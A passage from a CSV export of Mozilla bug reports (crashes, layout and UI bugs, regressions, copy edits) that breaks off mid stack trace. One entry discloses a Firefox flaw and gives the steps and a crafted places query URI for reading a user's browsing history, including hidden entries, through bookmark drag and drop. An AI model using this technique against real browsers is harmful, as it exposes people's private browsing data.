13570,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4  I could only escape it by shutting down the browser and restarting it. If I was quick enough to close the tab before it could begin loading when I reopen the crashed session, I could stop it freezing again, but that was very difficult.  Since facebook.com uses some special plugin to upload photos, I think that's what's causing the problem.  Reproducible: Always  Steps to Reproduce: 1. Go to an album you own at facebook.com on a computer that doesn't have the upload plugin 2. Click on 'edit'  Actual Results:   Firefox freezes.  Expected Results:   The 'edit album' page should load.  Again, I suspect this bug is caused by something to do with facebook.com's upload application.","""Edit photo album"" at facebook.com causes firefox to freeze"
13688,We need to move the existing tracking protection content out of the doorhanger that's currently shared with the Mixed Content Blocking feature.,Move existing Tracking Protection functionality from shield doorhanger to Control Center
13724,"Some use cases that have been found via user feedback: * It's hard to determine how groups are created (where does one go? how does one add groups?) * It's hard to understand what other groups people can create.   I think an example or some gray text explaining what to do will be really beneficial in the groups box.   Also, a tooltip somewhere with the following sentence:  ""Add groups to associate yourself to other Mozillians! Don't worry about mispellings, the groups box will pick up a default group if you're close!""",Need a better explanation of what groups is and how it works in the UI
13768,"Using a linux build from today mozilla crashes if you go to any bug in bugzilla and try to create an attachment, the crash happens when you click on the ""Browse"" button, just before the filepicker should pop up. I only have a release build so I can't point at the exact location where the crash occures, but I'll attach a stacktrace that gives you some idea about where the crash occures...  I don't see this problem on WinNT.",Crash when trying to create bugzilla attachment.
13822,The old code used to check for an image frame and reframe if there wasn't one... I guess we need to try to do that here too.  Of course it's not clear how this affects <object>....  Perhaps a better way is to reframe if the CURRENT_REQUEST has an error status.  But what happens if the CURRENT_REQUEST is simply null?  That's covered by http://web.mit.edu/bzbarsky/www/testcases/image-loading/appendNoSrcAndSetSource-standards.html,[FIX]Setting src on broken image broke in standards mode
13835,Using BuildID 2003072404 on WinXPSP1 with BClary's UA sidebar installed 1. Try changing UA string  Expected result 1. Popup window asking for granting permision  Actual result 1. Following message appears in JavaScript Console: Error: uncaught exception: enablePrivilege not granted 2. No popup window  Works fine in BuildID 2003072304 and prior,Error: uncaught exception: enablePrivilege not granted
13845,"[Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8b3) Gecko/20050708 SeaMonkey/1.0a] (nightly) (W98SE)  In ""Add/Remove Programs"", program name was rebranded from ""Mozilla (1.8b2)"", which was fine to ""SeaMonkey (1.0)"", which is out of sync..  This is misleading, and, if it works as ""Mozilla"" was, will prevent installing v1.0a along v1.0b along v1.0(f) :-(","[SM v1.0a++, Windows] In ""Add/Remove Programs"", version is ""1.0"" instead of ""1.0a"""
13953,The copy for the autoplay exceptions dialog needs updated,Update autoplay exceptions copy
13955,"STR:  0. Install profiler from https://profiler.firefox.com/  1. Visit about:blank.  2. Ctrl+Shift+1 to start profiling.  3. Ctrl+T to open a new tab.  4. After a few seconds, Ctrl+Shift+2 to stop profiling.  ACTUAL RESULTS: Profile shows a red bar for a period of jank, which includes some flexbox layout.  In particular, there are some script-triggered sync reflows from an IntersectionObserver callback which checks `.clientWidth`, which I suspect are associated with image lazy-loading.  EXPECTED RESULTS: I suspect the series of short script/IntersectionObserver-triggered reflows should probably be cheap or free, because layout is probably not changing much.  I'm not sure whether the tiles are styled such that we can theoretically infer that the flex containers involved don't need to reflow, or if there's styling that we would need to add (along with optimizations) to reliably get that result -- but one way or another, we should try to be sure that no serious reflow work needs to happen after the initial layout.  Also/alternatively, perhaps the about:newtab code shouldn't be reading clientWidth in the IntersectionObserver callback, since that forces any of the callback's earlier restyling to be immediately flushed. We're probably not coalescing these multiple IntersectionObserver-callback-invocations' restyling at all right now, due to the fact that they're doing this flush.  Here's a profile I captured of the STR, using current Nightly: https://perfht.ml/2SWyogu (filtered for nsFlexContainerFrame) The series of 9 reflows (each 2-3ms long) after timestamp 1.64s are the ones that I'm primarily concerned with improving/avoiding.",New-tab page has some kinda-slow synchronous flexbox/grid layout
14091,"See attachment 310986 [details] close.png - the first state is wrong, I think  I believe that the states should be:  active | hovered | pressed | inactive  the newly checked in close.png has a grey background in the ""normal"" state, which makes it look inactive on luna (see http://img521.imageshack.us/my.php?image=zzvx8.jpg).  Alex: can you update close.png and re-attach? It would be great if we could get this fixed for beta, as I've seen a bunch of people asking about it.",close.png should use close box with red background for active state
14134,"Created attachment 9123950 Toggle Reader View Tooltip.jpg  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0  Steps to reproduce:  Open a page where the Reader view is available - the Reader View icon appears in the address bar.   Press F9 to toggle the Reader Mode.   The tooltip shows VK_F9 instead of F9, see Attachment.  A new profile doesn't fix the problem.   Actual results:  Nothing happens.   Expected results:  The Reader view schould be opened.",Keyboard shortcut for toggle reader view (F9) doesn't work
14155,See https://mozilla.invisionapp.com/share/5ZAEYEW8M#/screens/225203398 .  We should restyle the footer to match the spec. This includes:  - extending it underneath the overflow panel (hamburger panel will be removed) - changing the background/border colours of the footer - updating the titlebar switch imagery / code - adding a 'done' button' next to 'restore defaults' that closes customize mode - ensuring the design works well on narrow window sizes (I'll file a UX bug for this).,Restyle customize mode footer
14173,"Open a private window.  Right-click the private browsing icon. The browser console shows     Error: No nodes without ids that aren't special widgets should ever come into contact with CUI  Click ""Pin to Overflow Menu"". The browser console shows     CustomizableUI:findWidgetInWindow was passed an empty string.     CustomizableUI:Widget '' not found, unable to move  Or click ""Remove from Toolbar"". The browser console shows     CustomizableUI:findWidgetInWindow was passed an empty string.     CustomizableUI:Widget  not found, unable to remove from widget-overflow-fixed-list     Empty string passed to getElementById().",Context menu offers to pin or remove private browsing icon and titlebar placeholders
14370,It has broken due to landing 1025146.  The same thing in the past is happening many times:( Are there no automated test?  Regression window: https://hg.mozilla.org/integration/fx-team/pushloghtml?fromchange=b4018ab42fd3&tochange=2529d411d5b1  REGRESSED BY: Bug 1025146,[non-e10s]and[e10s] external editor (view_source.editor.external) doesn't work on NIGHTLY 41.0a1
14375,Steps to reproduce: 1) Ctrl+Shift+M to open responsive design view 2) Ctrl+Shift+M to exit responsive design view 3) Ctrl+U to open page source  Actual results A blank page (completely white) opened in a new tab  Expected results The page source should have opened in a new tab  Versions tested 53.0a1 (2017-01-16) (64-bit) [issue present] 51.0b14 (64-bit) [issue NOT present] 50.1.0 [issue NOT present],View source open an blank page when using responsive design view
14393,"Created attachment 9035612 translate prompt.mov  master d3368037d569  1. Go to www.lefigaro.fr and select ""No"" when prompted to translate. 2. Long press on a link and select ""Open in New Tab"" 3. Don't switch to the new tab  Expected: The translate prompt should be displayed only when switching to the new tab.  Actual: The translate prompt is displayed in the main page.",The translate prompt is displayed on the main page when opening a link in a background tab
14470,This issue goal is enabling the ExtensionStorageIDB backend on Nightly (and it is going to depend from the bugzilla issues that have been identified as blockers for being able to enable this pref on Nightly).,Enable ExtensionStorageIDB backend on Nightly
14487,"Aaron Benson has made some mocks for adding settings to finely control the pieces of Activity Stream (Highlights, Pocket, Top Sites).",Add settings for toggling Activity Stream
14509,"Created attachment 9057015 poc.htm  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0  Steps to reproduce:  Using attached PoC:  1. If you don't have bookmarks bar open then open sidebar bookmark page by pressing CTRL+B 2. Drag and drop the anchor tag into the bookmark bar/sidebar  3. Now drag and drop the newly created bookmark into the webpages body     Actual results:  For some reason the dragged object from the bookmark bar contains 'text/html' formatted data of all the queried history entries. Which means we can steal users history data (even loaded iframes) with precision, thanks to the use of the places query.  Step [2] creates a places query ( https://developer.mozilla.org/en-US/docs/Mozilla/Tech/Places/Places_query_URIs ) that looks like:  place:type=0&sort=1&terms=token&maxResults=10&includeHidden=true  I am looking within the users history for any entry with the term 'token' in the URL, for testing purposes I only grab 10 entries but this could be increased in an attack scenario. I also use the 'includeHidden' query operator to include otherwise hidden history entries that come from iframes and images, just to further expand my net.  Step [3] is where I think the bug exists. Once we drag the newly created places query bookmark back into our webpage, we can read all the results from our query by reading the 'text/html' data entry.     Expected results:  There should not be a ''text/html' readable data when drag and dropping bookmarks from firefox and to firefox. I believe this may have been put there for cross application compatibility but is of no use (AFAIK) when it comes to drag and dropping within firefox.",Stealing history data using places querying and drag and drop
14545,"Created attachment 8830619 Test case  I totally did the wrong fix for bug 1329351, the popup was supposed to show on INSECURE password fields even if password manager is off, instead bug 1329351 made it so that it never appears. This is bad because I don't want users to turn off password manager (because sites suggest it) in order to stop the insecure warning. It also means some users wouldn't be protected by this feature we're promoting heavily.  STR: 1) Set signon.rememberSignons = false (Maps to checkbox on the Security tab for pwmgr) 2) Open the testcase 3) Submit some form history for a given <input> @name. 4) Open the autocomplete popup (e.g. down arrow or focus) for a password field with the same @name.  Expected result: Insecure password field warning appears in the dropdown with no other result.  Actual result: No popup appears  [Tracking Requested - why for this release]: No insecure field warning will appear if password manager is disabled",Insecure password field warning doesn't appear on password fields if password manager is disabled
14548,"This won't handle morphing to a single name field, only combining the borders/outlines.",Combine the borders of the name fields on the address form
14661,"saw this in a talkback report filed by Jaime using the 094 branch. I haven't seen this show up before. Incident ID: 36728446  nsMsgDatabase::RowCellColumnToCharPtr [d:\builds\seamonkey\mozilla\mailnews\db\msgdb\src\nsMsgDatabase.cpp, line 2917] nsMsgHdr::GetSubject [d:\builds\seamonkey\mozilla\mailnews\db\msgdb\src\nsMsgHdr.cpp, line 592] nsMsgDatabase::ThreadNewHdr [d:\builds\seamonkey\mozilla\mailnews\db\msgdb\src\nsMsgDatabase.cpp, line 3255] nsMsgDatabase::AddNewHdrToDB [d:\builds\seamonkey\mozilla\mailnews\db\msgdb\src\nsMsgDatabase.cpp, line 2582] nsMsgMailboxParser::PublishMsgHeader [d:\builds\seamonkey\mozilla\mailnews\local\src\nsParseMailbox.cpp, line 352] nsMsgMailboxParser::HandleLine [d:\builds\seamonkey\mozilla\mailnews\local\src\nsParseMailbox.cpp, line 416] nsMsgLineBuffer::ConvertAndSendBuffer [d:\builds\seamonkey\mozilla\mailnews\base\util\nsMsgLineBuffer.cpp, line 219] nsMsgLineBuffer::BufferInput [d:\builds\seamonkey\mozilla\mailnews\base\util\nsMsgLineBuffer.cpp, line 192] nsMsgMailboxParser::ProcessMailboxInputStream [d:\builds\seamonkey\mozilla\mailnews\local\src\nsParseMailbox.cpp, line 273] nsMsgMailboxParser::OnDataAvailable [d:\builds\seamonkey\mozilla\mailnews\local\src\nsParseMailbox.cpp, line 75] nsMailboxProtocol::ReadFolderResponse [d:\builds\seamonkey\mozilla\mailnews\local\src\nsMailboxProtocol.cpp, line 503] nsMailboxProtocol::ProcessProtocolState [d:\builds\seamonkey\mozilla\mailnews\local\src\nsMailboxProtocol.cpp, line 663] nsMsgProtocol::OnDataAvailable [d:\builds\seamonkey\mozilla\mailnews\base\util\nsMsgProtocol.cpp, line 246] nsOnDataAvailableEvent::HandleEvent [d:\builds\seamonkey\mozilla\netwerk\base\src\nsStreamListenerProxy.cpp, line 188] PL_HandleEvent [d:\builds\seamonkey\mozilla\xpcom\threads\plevent.c, line 591]",crash in mailnews  [@ MSVCRT.DLL - nsMsgDatabase::RowCellColumnToCharPtr]
14760,"I've no clue why this brings up mutiple ""Save As"" dialog once this web page is loaded. Very annonying :)  Build: Todays commercial build on Win NT.","when this web page loads it brings up a ""save as"" dialog."
14798,"When the bookmarks or history panel is animating out over the library panel, but not fully open yet, the library panel disappears (or animates out, I can't tell which) which feels distracting. I think it would look better if the background library panel stayed put until the bookmarks/history panel had fully animated out.  Compare with the animation of the library panel on top of the main menu where the main menu stays put.",library panel shouldn't close until bookmarks / history panel has animated all the way out
14826,"Created attachment 8782482 permission misalignment.png  [Affected versions]: - 51.0a1 (2016-08-18)  [Affected platforms]: - Win 7  [Steps to reproduce]: 1. Open any page 2. Open the Control Center, expand it, then click on More Info/Permissions 3. Change some permissions from the default state (e.g. set microphone to 'Block') 4. Open the Control Center again  [Expected result]: - Allow/Block aligned with the X button  [Actual result]: - misalignment between Allow/Block and the X button  [Regression range]: - caused by bug 1290174  [Additional notes]: - Windows only",X button is vertically misaligned on the permission dropdown
14843,"Targeting for 2.2.3, the mobile site merging with desktop (which doesn't exist at the moment).  We'll need a mobile home page for that.",Import CSS+graphics for mobile.SUMO modules
14910,"Created attachment 8988512 Empty state for font editor should not show up.  The patch for Bug 1464796 accidentally removed a guard that now causes the FontEditor to show up in its empty state with the message ""No fonts were found for the current element"" even when the FontEditor pref is OFF.   This has slipped into the 62 build, currently in Beta.",Font editor: Empty state for FontEditor mistakenly shows up when its pref is OFF
14926,"Originally posted by:linclark  see https://github.com/devtools-html/gecko-dev/issues/196  Parent issue: #140   Where it is received: https://dxr.mozilla.org/mozilla-central/source/devtools/client/webconsole/webconsole.js#3348  Where it comes from: 10 different places, starting here https://dxr.mozilla.org/mozilla-central/source/devtools/server/actors/webconsole.js#2064",Support network event update messages #196
14930,"- the ""performance"" icon in the summary info should change opacity on mouseover. There are rules for "".devtools-button::before"" that do this, but they don't apply in this case. - the colors of the performance icon and the summary text should be the same. They aren't in the dark theme - white vs lightblue  This CSS issue is spotted by Jarda https://bugzilla.mozilla.org/show_bug.cgi?id=1309194#c50. There are existed problems in summary button and it needs CSS improvement.",CSS improvement for summary button
14947,"The fix in bug 1303279 works on the first replaceTrack/renegotiation, but fails in subsequent ones.  this is because mSendingWidth is reset to 0 later in that call, and if nothing else tweaks it, we'll fail to copy the data on future replace/renegotiations.",Resolution for outbound video stream drops to 352x288 on replacing video track during webrtc call.
15118,"Please remove mention of Uberview in the ""Organize your tabs"" text.   It should say ""Reclaim your browser from tab clutter! Drag and drop your tabs into manageable groups that you can organize, name and arrange in a fun and visual way.""",Remove Uberview mention on beta features page.
15119,"Please remove mention of Uberview in this page.   Copy should read ""Having a hard time keeping track of all your open tabs? Reclaim your browser from tab clutter! Easily drag and drop your tabs into manageable groups that you can organize, name and arrange in a fun and visual way.""",Remove Uberview mention on beta whats new page
15148,"Created attachment 8971819 Screenshot  See attached. They're located at the right place, but not in the right direction. They should be mirrored so they'd be directed to the left-bottom (currently right-bottom).  Note: This applies to all resizer icons across Preferences/Options, and not just in the Languages window as shown in the attached screenshot.",[RTL] Resizer icons mirrored
15220,"STEPS TO REPRODUCE    1. Open http://www.w3.org/TR/REC-CSS1    2. Hit tab until you have focussed the ""Terminology"" link.    3. Hit enter (to follow the internal link to the ""Terminology"" section).    4. Hit tab to highlight the ""[5]"" link under ""child element"".  ACTUAL RESULTS    After you hit the tab in step 4, you are moved all the way back up to the    contents list. This is very disturbing.  EXPECTED RESULTS    I propose that the current tabbing position be moved to the target anchor    whenever the page is scrolled by following an internal link.",Tab position not moved when following relative links (to named anchors)
15331,"When doing forward inline of a message with another message attached in it, the memory get corrupted which lead to random crash. This problem is very easy to reproduce under MacOS X after you have applied the patch for bug 156958.  Step to reproduce the problem: 1) Send a message to yourself (I personnaly encrypt & sign it but I don't know if it's matter) 2) Get the message and forward it as attachment 3) Get the forwarded message and forward it inline ==> You might crash at any time now, if not, repeat step 3 couple times...",Random crash after doing a forward inline
15361,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3a) Gecko/20021202 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3a) Gecko/20021202  Mozilla 1.2.1 is correct. If the font-size in the CSS is smaller than 1.0em the latest trunk does not render this text.  Reproducible: Always  Steps to Reproduce: 1. go to http://www.mozillazine.org/ 2. try to read text with class=""stryTxt"" 3.  Actual Results:   text with class=""stryTxt"" is invisible  Expected Results:   text should render correctly (like mozilla 1.2.1)  if I alter the font-size in http://www.mozillazine.org/frontpage.css to ""font-size: 1.0em;"" then the text is visible",font-size: 0.8em; becomes invisible
15412,"Created attachment 8983748 SV - sidebar cannot be resized.gif  [Affected versions]: - Firefox Developer Edition 610b.11 - Nightly 62.0a1 (Build ID: 20180605141053) - Side View 0.4.3  [Affected Platforms]: - All Windows - All Linux  [Prerequisites]: - Have a clean Firefox profile with the latest Dark Mode v0.2.6 installed and active (https://addons.mozilla.org/en-US/firefox/addon/dark-mode-webextension/?src=search).  Steps to reproduce: 1. Open the browser with the profile from prerequisites. 2. Navigate to https://testpilot.firefox.com/experiments/side-view and install the Side View add-on. 3. Resize the sidebar to its maximum width. 4. Restart the browser and observe the behavior.  [Expected results]: - The sidebar is displayed to its maximum width.  [Actual results]: - The sidebar is displayed to a different width and it can not be resized to its maximum width even if you drag it.  [Regression]: This issue is not reproducible on latest Firefox Release 60.0.1. Considering this, I've ran the Mozregression tool, in order to find a regression-window. Here are the results: Last good revision: 7f92f91fa85d78c434709ec162d4320c5ee686fd First bad revision: fa02de71ebf73aea9f5d30b591aacd83b3440bd3 Pushlog: https://goo.gl/zkySkF  From the provided pushlog it seems that bug 1454820 introduced this issue.  [Notes]: - This issue is reproducible on Arch Linux 4.12. - This issue is not reproducible on Mac 10.13 and Ubuntu 16.04. - The issue is also reported in the Side View GitHub repository, here: https://github.com/mozilla/side-view/issues/274 - Attached is a screen recording with this issue.",The Side View sidebar cannot be resized to its maximum width after restarting the browser if Dark Mode add-on is installed
15435,"When you type characters more than one line and use Backspace key to delete whole characters, you will lose the caret  in Composer.  Steps of reproduce 1. Open Composer 2. Type ""aaaa"" and hit return to go to next line 3. Type ""bbbb"" 4. Hit Backspace key 9 times to delete whole characters 5. Hit one more Backspace key  You will lose the caret.  You cannot type any characters in Composer anymore until you close Composer and start it again.  Tested 2000030108 Win32, MAC, and 2000030113 Linux build.",nsHTMLEditRules::AfterEdit needs to ensure that the caret is always made visible again
15542,buildid:  2001-03-15-14 on win98 buildid:  2001-03-16-08 on mac           2001-03-14-21 on linux  steps to reproduce: Send this page http:\\bugzilla.mozilla.org/show bug.cgi?id=70928 from the  browser After receiving this you will see the page displayed inline and the page is  rendered correctly Click on forward button from the toolbar and send this to yourself  Actual result:  The forwared page displays html tags and the page is not  rendered the way it was sent initially.    Expected result:  forwarded mail when received should display the page correctly,Forwarding an html page is not rendered correctly whnereceived
15548,http://tinderbox.mozilla.org/showlog.cgi?log=SeaMonkey/1341473203.1341476269.12844.gz&fulltext=1 WINNT 5.2 comm-central-trunk debug test mochitest-other on 2012/07/05 00:26:43 { 4322 ERROR TEST-UNEXPECTED-FAIL | chrome://mochitests/content/chrome/dom/system/tests/test_constants.xul | an unexpected uncaught JS exception reported through window.onerror - NS_ERROR_XPC_BAD_IID: Component returned failure code: 0x80570018 (NS_ERROR_XPC_BAD_IID) [nsIJSCID.getService] at chrome://mochitests/content/chrome/dom/system/tests/test_constants.xul:39 4323 ERROR TEST-UNEXPECTED-FAIL | chrome://mochitests/content/chrome/dom/system/tests/test_constants.xul | Test timed out. },Port |Bug 750178 - [OS.File] Export OS.Constants to the main thread| to SeaMonkey
15691,"1.) Visit mail.yahoo.com, enter data and say yes to save the data. 2.) Change or create the master password. 3.) Encrypt the data, and enter your password. What happens: The PSM Private Keys password is not accepted.",Cannot encrypt data
15742,"From Bugzilla Helper: User-Agent: Mozilla/4.76 [en] (Win98; U) BuildID:      Mozilla nightly builds crash on startup on my Win98 / AMD Duron CPU system.   Here's the error message:  MOZILLA caused an invalid page fault in module JS3250.DLL at 015f:60ad48c1. Registers: EAX=81741ce4 CS=015f EIP=60ad48c1 EFLGS=00010202 EBX=00000000 SS=0167 ESP=0068f308 EBP=027093e0 ECX=0080f570 DS=0167 ESI=006b1a80 FS=3327 EDX=8173b130 ES=0167 EDI=00000001 GS=0000 Bytes at CS:EIP: 8b 07 89 46 2c 8b 47 04 eb 19 ff 15 e8 70 af 60  Stack dump: 027093e0 02717510 0068f338 027093e0 00000000 60adfe71 027093e0 00000000 027093e0 02717510 00000000 00000020 0068f35c 60ad4443 027093e0 60affe30  After trying to run Mozilla, the splash screen comes up, the hard drive chugs  for about 10 seconds, and then the Windows error message listed above pops up.   Oddly enough, I noticed that about 300-700 0-byte files are created in my  \windows\temp directory, of name *.XUL.  I have tried various things such as completely deleting my \mozilla directory.   I have also deleted \windows\application data\mozilla directory, as well, to no  avail.  Reproducible: Always Steps to Reproduce: 1.Install Mozilla nightly build 2.run mozilla.exe 3.  Actual Results:  Windows error message box pops up, Mozilla crashes after  start-up screen.  Expected Results:  Mozilla starts-up.  heh  OS: Windows 98 CPU: AMD Duron 800 Mhz Video: Nvidia GeForce2 MX","Mozilla nightly builds crash on startup, missing MSVCIRT.DLL"
15766,***** observed with 2000-04-26 build ***** Steps to reproduce: -open new mail; -type some text into the Subject field ; -select and copy the string (Ctrl+C); - try to paste into the same field or into the body; //note: nothing happens (guess it is general copy/paste bug),Regression:Unable to copy/paste in any field of New mail composition window
15776,"Using the latest Linux nightly build (02-14-16-M14), when I attempt to send an email that I have composed, the email composer window disappears momentarily and then reappears, with the message still there. In other words, nothing seems to have happened, and the message is not delivered. I do have an SMTP server set up, so it should work. A bit hard for me to play with much since Mail/News is crashing when I open it a second time in a single Mozilla session (forget which bug # that is). I will see if I can figure this one out a bit better and post more when I have. In any case, I am unable to send mail with Mozilla at all.",Failure to send mail when pressing Send button
15844,"There are a serious number of issues with window sizes and panel painting when using Windows large fonts (control panel|display|settings|advanced|font size>large fonts).  My screen resolution is currently set to 1280x1024 large fonts.  Many dialog windows are too small to display all the content, and content is often painted outside panel boundaries.  I have been able to fix only a few of these myself in various xul or css files.  Please, please, please include large font settings in whatever testing you do for UI changes.  Win users will appreciate it greatly.",Numerous display problems using Windows large fonts
15879,"tested 062914 mozilla bits build.  Could reproduce on Mac but not on NT(062914). steps to reproduce: 1.  launch mozilla browser 2.  click the online/offline switch thing in the status bar. 3.  click it again so you're back online. 4.  type cnn.com (or any other URL) into the addressbar. 5.  hit enter to visit cnn.com  results: crash  here is the macsbug sc if it's helpful.  (CurStackBase does not seem to apply...dumping 4K.) Calling chain using A6/R1 links Back chain ISA Caller 0E14D0C0 PPC 1EF87A98 PRP_TryLock+00994 0E14D050 PPC 1EE6B89C nsThread::Main(void*)+00028 0E14D000 PPC 1E9F3A6C nsSocketTransportService::Run()+0019C 0E14CF90 PPC 1E9F326C nsSocketTransportService::ProcessWorkQ()+00074 0E14CF40 PPC 1E9EEC5C nsSocketTransport::Process(short)+004D8 0E14CED0 PPC 1E9EEF1C nsSocketTransport::doResolveHost()+0011C 0E14CE50 PPC 1EA01A54 nsDNSService::Lookup(const char*, nsIDNSListener*, nsISupports*, nsIRequest**)+00288 0E14CD90 PPC 1EA0056C nsDNSLookup::HandleRequest(nsDNSRequest*)+00034 0E14CD50 PPC 1EA00D24 nsDNSLookup::Resume(nsDNSRequest*)+00160 0E14CCD0 PPC 1EA00824 nsDNSLookup::InitiateLookup()+0025C",offline and back online then crash on dns lookup
15984,"From Bugzilla Helper: User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0) BuildID:    20000625  Edit -> Preferences -> Advanced -> Cache - Select DISK CACHE, hit the choose folder button. Use the popup to navigate to directory and netscrape crashes once you select a dir and dr watson pops up.    Reproducible: Always Steps to Reproduce: 1.Edit 2.Preferences 3.Advanced 4.Cache 5. Select DISK Cache 6. Hit the Choose Folder 7. Navigate to folder 8. Click Ok. 9. Netscape Crashes  Actual Results:  Crash - dr watson.  Expected Results:  change disk path of disk cache. Infact with build 20000625  there is no default for disk cache size nor directory???  No defaults, filling in disk parameters for cache and netscape crashes",crash on disk cache preferences
16141,"From Bugzilla Helper: User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Mac_PowerPC) BuildID:    2000062108  INPUT TYPE=""TEXT"" SIZE=""[x]"" isn't coming out [x], but quite a bit longer than [x].  Reproducible: Always Steps to Reproduce: 1. Load provided URL 2. Examine ""Subscribe to EFF Newsletter"" table on left. 3. Compare width of text entry field to what is specified in the source.  Actual Results:  Too-wide text entry field appears.  Expected Results:  Input field width exactly the size specified.  Bug 7543 seems to be closely related (especially the discussion in it, though the bug  itself appeared to be reporting problems with how many chars the field would *accept*  vs. how much room it has to display them. I'm reporting the latter).  One of the commentators in Bug 7543  says essentially that this is a feature, not a bug,  but I beg to differ.  Said respondent suggests basically that the browser  should just be  allowed to guess, since it uses a proportional (non-monospaced) font for text entry.  This  strikes me as completely absurd. Using such a font is obviously a bug in and of itself (one  inherited unfortunately from most Windows browsers; I don't know of any other  browsers that have this problem), because unless a monospaced (non-proportional) font  is used, the SIZE attribute of INPUT TYPE=""TEXT"" is rendered completely and totally  useless.  Secondary effects include mangling of carefully arranged layout (a problem  that's been vexing me enough to report it.)  I do not know if Mozilla for Windows or *n*x suffers from this problem. I note that  Netscape 4.x for Mac does NOT have this problem, and neither does IE 4.x or 5.x for Mac.   Both IE 4.x and NS 4.x for Windows have this or a similar problem (NS 4.x/Win has the  same problem, IE 4.x/Win. DOES use a monospaced font, but mis-sizes the field by about  3 or so characters anyway, at least on this test page.)  At any rate, text entry in any field the size of which is set in characters MUST necessarily  be in a monospaced font, or it breaks the functionality of this aspect of HTML.  Netscape 6beta has this problem too, I just discovered.","SIZE element in INPUT TYPE=""TEXT"" handled incorrectly"
16162,"On 2000-02-14 build,   1. Run ""mozilla -ProfileManager"" 2. Click ""Create Profile"" 3. Click ""Next"" in profile wizard 4. Click ""Cancel"" in profile wizard 5. Click ""Create Profile""  CRASH!  Expected behavior: Get the profile wizard window a second time.  The below stack trace suggests that this is in the focus tracking code, so I'm  gonna give this to saari to start with. It looks like the ""last focused  content"" (focus memory?) is no longer in any document, so we're just blindly  dereferencing a null doc pointer at  http://lxr.mozilla.org/mozilla/source/layout/events/src/nsEventStateManager.cpp #555  NTDLL! 77f76148() nsDebug::Assertion(const char * 0x01508a10  ??_C@_0DJ@KMGL@You?5can?8t?5dereference?5a?5NULL?5nsC@, const char * 0x01508a54  ??_C@_0N@NHHF@mRawPtr?5?$CB?$DN?50?$AA@, const char * 0x01508a64  ??_C@_0BO@LIAM@?4?4?2?4?4?2dist?2include?2nsCOMPtr?4h?$AA@, int 591) line 189 +  13 bytes nsDebug::PreCondition(const char * 0x01508a10  ??_C@_0DJ@KMGL@You?5can?8t?5dereference?5a?5NULL?5nsC@, const char * 0x01508a54  ??_C@_0N@NHHF@mRawPtr?5?$CB?$DN?50?$AA@, const char * 0x01508a64  ??_C@_0BO@LIAM@?4?4?2?4?4?2dist?2include?2nsCOMPtr?4h?$AA@, int 591) line 278 +  21 bytes nsCOMPtr<nsIDocument>::operator->() line 591 + 34 bytes nsEventStateManager::PreHandleEvent(nsEventStateManager * const 0x026886f0,  nsIPresContext * 0x0249df10, nsGUIEvent * 0x0012ef2c, nsIFrame * 0x00efe09c,  nsEventStatus * 0x0012ee94, nsIView * 0x02541420) line 555 + 35 bytes PresShell::HandleEvent(PresShell * const 0x02542d24, nsIView * 0x02541420,  nsGUIEvent * 0x0012ef2c, nsEventStatus * 0x0012ee94) line 2929 + 43 bytes nsView::HandleEvent(nsView * const 0x02541420, nsGUIEvent * 0x0012ef2c,  unsigned int 28, nsEventStatus * 0x0012ee94, int & 0) line 799 nsViewManager::DispatchEvent(nsViewManager * const 0x02541850, nsGUIEvent *  0x0012ef2c, nsEventStatus * 0x0012ee94) line 1704 HandleEvent(nsGUIEvent * 0x0012ef2c) line 69 nsWindow::DispatchEvent(nsWindow * const 0x02541304, nsGUIEvent * 0x0012ef2c,  nsEventStatus & nsEventStatus_eIgnore) line 493 + 10 bytes nsWindow::DispatchWindowEvent(nsGUIEvent * 0x0012ef2c) line 514 nsWindow::DispatchFocus(unsigned int 107) line 3078 + 15 bytes nsWindow::ProcessMessage(unsigned int 8, unsigned int 80545128, long 0, long *  0x0012f180) line 2337 + 19 bytes nsWindow::WindowProc(HWND__ * 0x003f057e, unsigned int 8, unsigned int  80545128, long 0) line 673 + 27 bytes USER32! 77e71ab7() USER32! 77e71a77() NTDLL! 77f7624f() USER32! 77e71310() nsWindow::DefaultWindowProc(HWND__ * 0x04cd0568, unsigned int 6, unsigned int  1, long 71566788) line 700 USER32! 77e7288d() USER32! 77e72918() nsWindow::WindowProc(HWND__ * 0x04cd0568, unsigned int 6, unsigned int 1, long  71566788) line 680 + 31 bytes USER32! 77e71ab7() USER32! 77e71a77() NTDLL! 77f7624f() nsXULWindow::SetVisibility(nsXULWindow * const 0x0285b304, int 1) line 490 nsXULWindow::OnChromeLoaded() line 632 nsWebShellWindow::OnEndDocumentLoad(nsWebShellWindow * const 0x0285b354,  nsIDocumentLoader * 0x0285b150, nsIChannel * 0x027c5680, unsigned int 0) line  1300 nsWebShell::OnEndDocumentLoad(nsWebShell * const 0x0285bee0, nsIDocumentLoader  * 0x0285b150, nsIChannel * 0x027c5680, unsigned int 0) line 2959 nsDocLoaderImpl::FireOnEndDocumentLoad(nsDocLoaderImpl * 0x0285b150, nsIChannel  * 0x027c5680, unsigned int 0) line 603 nsDocLoaderImpl::DocLoaderIsEmpty(unsigned int 0) line 494 nsDocLoaderImpl::DocLoaderIsEmpty(unsigned int 0) line 466 nsDocLoaderImpl::OnStopRequest(nsDocLoaderImpl * const 0x02857d44, nsIChannel *  0x0274e530, nsISupports * 0x00000000, unsigned int 0, const unsigned short *  0x00000000) line 438 nsLoadGroup::RemoveChannel(nsLoadGroup * const 0x02857ce0, nsIChannel *  0x0274e530, nsISupports * 0x00000000, unsigned int 0, const unsigned short *  0x00000000) line 535 + 42 bytes nsFileChannel::OnStopRequest(nsFileChannel * const 0x0274e534, nsIChannel *  0x0274e630, nsISupports * 0x00000000, unsigned int 0, const unsigned short *  0x00000000) line 455 nsOnStopRequestEvent::HandleEvent(nsOnStopRequestEvent * const 0x02757dc0) line  279 nsStreamListenerEvent::HandlePLEvent(PLEvent * 0x02757b00) line 93 